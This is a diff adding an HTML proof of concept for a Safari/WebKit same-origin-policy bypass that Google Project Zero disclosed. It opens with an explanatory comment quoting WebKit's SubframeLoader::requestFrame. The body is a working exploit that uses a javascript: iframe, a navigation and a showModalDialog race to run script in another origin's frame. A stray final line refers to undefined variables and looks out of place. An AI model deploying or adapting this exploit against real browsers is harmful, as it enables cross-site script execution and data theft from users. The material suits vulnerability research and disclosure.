@@ -1,0 +1,73 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1121
+
+Here's a snippet of the method SubframeLoader::requestFrame which is invoked when the |src| of an iframe object is changed.
+
+bool SubframeLoader::requestFrame(HTMLFrameOwnerElement& ownerElement, const String& urlString, const AtomicString& frameName, LockHistory lockHistory, LockBackForwardList lockBackForwardList)
+{
+    // Support for <frame src="javascript:string">
+    URL scriptURL;
+    URL url;
+    if (protocolIsJavaScript(urlString)) {
+        scriptURL = completeURL(urlString); // completeURL() encodes the URL.
+        url = blankURL();
+    } else
+        url = completeURL(urlString);
+
+    if (shouldConvertInvalidURLsToBlank() && !url.isValid())
+        url = blankURL();
+
+    Frame* frame = loadOrRedirectSubframe(ownerElement, url, frameName, lockHistory, lockBackForwardList); <<------- in here, the synchronous page load is made.
+    if (!frame)
+        return false;
+
+    if (!scriptURL.isEmpty())
+        frame->script().executeIfJavaScriptURL(scriptURL); <<----- boooom
+
+    return true;
+}
+
+A SOP violation check is made before the above method is called. But the frame's document can be changed before |frame->script().executeIfJavaScriptURL| called. This can happen by calling |showModalDialog| that enters a message loop that may start pending page loads.
+
+Tested on Safari 10.0.3(12602.4.8).
+
+PoC:
+-->
+
+<body>
+<p>click anywhere</p>
+<script>
+
+window.onclick = () => {
+    window.onclick = null;
+
+    f = document.createElement('iframe');
+    f.src = 'javascript:alert(location)';
+    f.onload = () => {
+        f.onload = null;
+
+        let a = f.contentDocument.createElement('a');
+        a.href = 'https://abc.xyz/';
+        a.click();
+
+        window.showModalDialog(URL.createObjectURL(new Blob([`
+<script>
+let it = setInterval(() => {
+    try {
+        opener[0].document.x;
+    } catch (e) {
+        clearInterval(it);
+
+        window.close();
+    }
+}, 100);
+</scrip` + 't>'], {type: 'text/html'})));
+    };
+
+    document.body.appendChild(f);
+};
+
+cached.src = kUrl;
+
+</script>
+</body>
